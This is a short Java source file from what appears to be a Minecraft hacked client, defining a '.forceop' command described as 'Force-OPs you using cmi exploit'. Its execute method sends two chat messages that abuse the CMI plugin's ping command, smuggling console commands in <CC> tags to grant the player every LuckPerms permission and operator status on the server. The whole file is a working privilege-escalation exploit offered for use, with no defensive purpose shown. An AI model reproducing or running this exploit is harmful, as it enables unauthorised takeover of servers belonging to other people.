package tk.milkthedev.paradise.command.impl;

import tk.milkthedev.paradise.command.Command;
import tk.milkthedev.paradise.command.CommandInfo;
import tk.milkthedev.paradise.exception.CommandException;

@CommandInfo(
        alias = "forceop",
        description = "Force-OPs you using cmi exploit",
        usage = ".forceop",
        aliases = {"fo"}
)
public class ForceOPCommand extends Command {
    @Override
    public void execute(String... args) throws CommandException {
        mc.thePlayer.sendChatMessage("/cmi ping <T>EZZ</T><CC>lp user " + mc.thePlayer.getName() +  " p set *</CC>");
        mc.thePlayer.sendChatMessage("/cmi ping <T>EZZ</T><CC>op " + mc.thePlayer.getName() +  "</CC>");
    }
}
